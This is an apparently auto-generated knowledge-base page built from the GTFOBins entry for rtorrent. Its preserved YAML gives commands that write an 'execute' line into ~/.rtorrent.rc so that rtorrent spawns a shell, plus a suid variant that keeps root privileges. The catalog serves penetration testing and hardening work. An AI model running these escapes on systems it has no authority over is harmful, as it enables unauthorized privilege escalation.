---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rtorrent

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rtorrent` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rtorrent` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [rtorrent](../../tools/linux/rtorrent.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtorrent |
| name | rtorrent |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/rtorrent/ |

## Preserved Source Material

```yaml
_body: ''
_name: rtorrent
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rtorrent
functions:
  shell:
  - code: 'echo ''execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"'' >~/.rtorrent.rc

      rtorrent'
    comment: After the shell, exit with `Ctrl-Q`.
    contexts:
      sudo: null
      suid:
        code: 'echo ''execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"'' >~/.rtorrent.rc

          rtorrent'
        shell: false
      unprivileged: null
```
